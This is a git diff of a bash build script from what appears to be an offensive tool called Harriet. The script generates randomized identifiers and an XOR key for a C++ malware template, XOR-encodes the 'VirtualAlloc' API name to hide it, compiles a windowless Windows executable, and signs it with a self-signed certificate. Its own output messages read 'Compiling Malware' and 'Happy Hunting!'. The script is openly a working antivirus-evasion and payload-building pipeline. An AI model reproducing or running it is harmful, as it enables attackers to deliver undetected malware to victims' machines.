@@ -84,11 +84,11 @@ cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-5} | head -n 1 > shell.txt
 Random6=$(cat shell.txt)
 sed -i "s/Random6/$Random6/g" Harriet/FULLAes/Resources/template.cpp
 
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-4} | head -n 1 > shell.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-5} | head -n 1 > shell.txt
 Random7=$(cat shell.txt)
 sed -i "s/Random7/$Random7/g" Harriet/FULLAes/Resources/template.cpp
 
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-2} | head -n 1 > shell.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-5} | head -n 1 > shell.txt
 Random8=$(cat shell.txt)
 sed -i "s/Random8/$Random8/g" Harriet/FULLAes/Resources/template.cpp
 
@@ -103,13 +103,13 @@ RandomA=$(cat shell.txt)
 sed -i "s/RandomA/$RandomA/g" Harriet/FULLAes/Resources/template.cpp
 
 #XOR KEY VALUE
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-15} | head -n 1 > shell.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-16} | head -n 1 > shell.txt
 XOR_KEY=$(cat shell.txt)
 sed -i "s/XOR_KEY/$XOR_KEY/g" Harriet/FULLAes/Resources/template.cpp
 sed -i "s/XOR_KEY/$XOR_KEY/g" Harriet/FULLAes/Resources/xor.py
 
 #XOR KEY VARIABLE
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-17} | head -n 1 > shell.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-18} | head -n 1 > shell.txt
 XOR_VARIABLE=$(cat shell.txt)
 sed -i "s/XOR_VARIABLE/$XOR_VARIABLE/g" Harriet/FULLAes/Resources/template.cpp
 rm shell.txt
@@ -118,22 +118,19 @@ rm shell.txt
 echo VirtualAlloc > virt.txt
 python3 Harriet/FULLAes/Resources/xor.py virt.txt > virtalloc.txt
 virt=$(cat virtalloc.txt)
-virt2="${virt::-8}" 
+virt2="${virt::-9}" 
 sed -i "s/VIRALO/$virt2/g" Harriet/FULLAes/Resources/template.cpp 
 rm virt*
 
 echo -e ${yellow}"+++Compiling Malware+++"${clear}
-x86_64-w64-mingw32-g++ -o $MALWARE Harriet/FULLAes/Resources/template.cpp -fpermissive -Wno-narrowing -O2>/dev/null 2>&1
+x86_64-w64-mingw32-g++ -o $MALWARE Harriet/FULLAes/Resources/template.cpp -fpermissive -Wno-narrowing Harriet/Resources/resources.res -mwindows -O2 >/dev/null 2>&1
 echo ""
 sleep 2
 rm shell*
 echo -e ${yellow}"***Malware Compiled***"${clear}
 echo ""
 sleep 2
-echo -e ${yellow}"+++Adding Binary Signature+++"${clear}
-echo ""
-sleep 2
-echo -e ${yellow}"+++Adding Binary Signature+++"${clear}
+echo -e ${yellow}"+++Adding Self Signed Cert+++"${clear}
 echo ""
 sleep 2
 # Set static paths for certificate, private key, executable, and signed output
@@ -165,6 +162,3 @@ osslsigncode sign -certs "$CERTIFICATE_PATH" -key "$KEY_PATH" -in "$MALWARE" -ou
 mv signed$MALWARE $MALWARE
 echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
 echo ""
-
-
-
